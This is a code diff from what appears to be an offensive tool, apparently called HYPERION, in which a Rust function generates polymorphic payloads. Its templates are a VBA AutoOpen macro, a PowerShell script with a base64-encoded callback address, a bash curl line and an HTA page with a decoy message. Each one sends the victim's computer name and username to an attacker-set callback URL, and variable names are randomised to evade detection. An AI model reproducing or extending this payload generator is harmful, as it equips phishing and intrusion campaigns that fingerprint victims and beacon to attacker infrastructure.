@@ -80,14 +80,14 @@ pub fn generate_polymorphic_payload(
     let raw_code = match spec.payload_type.as_str() {
         "vba" => {
             // Base VBA beacon
-            let base = format!('Sub AutoOpen()
+            let base = format!(r#"Sub AutoOpen()
   ' HYPERION {wm}
   On Error Resume Next
   Dim {req} As Object
   Set {req} = CreateObject("MSXML2.ServerXMLHTTP.6.0")
   {req}.Open "GET", "{cb}?d=" & Environ("COMPUTERNAME") & "&u=" & Environ("USERNAME"), False
   {req}.Send
-End Sub',
+End Sub"#,
                 req = rnd_var(&mut rng),
                 wm = watermark, cb = spec.callback_url);
 
@@ -102,22 +102,22 @@ End Sub',
                 spec.callback_url.as_bytes());
             let ps_var1 = rnd_var(&mut rng);
             let ps_var2 = rnd_var(&mut rng);
-            format!('# HYPERION {wm}
+            format!(r#"# HYPERION {wm}
 ${v1} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{cb_b64}'))
 ${v2} = New-Object System.Net.WebClient
-${v2}.DownloadString("${v1}?h=$env:COMPUTERNAME&u=$env:USERNAME") | Out-Null',
+${v2}.DownloadString("${v1}?h=$env:COMPUTERNAME&u=$env:USERNAME") | Out-Null"#,
                 v1=ps_var1, v2=ps_var2,
                 cb_b64=b64_cb, wm=watermark)
         },
         "bash" => {
-            format!('#!/bin/bash
+            format!(r#"#!/bin/bash
 # HYPERION {wm}
-{v}=$(curl -s "{cb}?h=$(hostname)&u=$(whoami)" 2>/dev/null || true)',
+{v}=$(curl -s "{cb}?h=$(hostname)&u=$(whoami)" 2>/dev/null || true)"#,
                 v=rnd_var(&mut rng), wm=watermark, cb=spec.callback_url)
         },
         _ => {  // HTA default
             let hta_var = rnd_var(&mut rng);
-            format!('<html><head><title>{title}</title>
+            format!(r#"<html><head><title>{title}</title>
 <HTA:APPLICATION APPLICATIONNAME="{title}" BORDER="none"/></head>
 <body><!-- HYPERION {wm} -->
 <script language="VBScript">
@@ -129,7 +129,7 @@ Sub Window_OnLoad
   {v}.Send
   MsgBox "{decoy}", 64, "{title}"
   window.close
-End Sub</script></body></html>',
+End Sub</script></body></html>"#,
                 v=hta_var, wm=watermark,
                 cb=spec.callback_url,
                 title=spec.decoy_text, decoy=spec.decoy_text)
